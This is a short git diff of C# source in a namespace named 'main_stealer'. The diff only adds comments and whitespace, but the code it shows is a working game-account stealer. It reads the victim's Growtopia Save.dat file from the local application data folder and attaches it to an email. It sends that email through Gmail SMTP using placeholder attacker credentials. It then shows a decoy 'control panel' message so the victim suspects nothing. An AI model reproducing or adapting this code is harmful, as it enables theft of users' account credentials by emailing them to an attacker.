@@ -22,8 +22,8 @@ namespace main_stealer
             mfmo.EnableSsl = true;
 
             mfmo.Credentials = new NetworkCredential("SENDERMAIL@gmail.com", "PASSWORD"); // sender of the mail , password of the mail
-                                                                                        // i suggest you to open a new mail for this
-
+                                                                                          // i suggest you to open a new mail for this
+            
             MailMessage mail = new MailMessage();
 
             mail.From = new MailAddress("SENDERMAIL@gmail.com", "NAME"); // sender of the mail , name of the sender
@@ -40,8 +40,10 @@ namespace main_stealer
             mail.Body = ""; // content of the mail, you can leave this empty
 
             mail.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat"));
+            // attaching save.dat file to mail
 
-            mfmo.Send(mail);
+            mfmo.Send(mail); // sending the mail
+            
             Console.Write("Press any key to close control panel.\n\n");
             Console.ReadKey();
         }
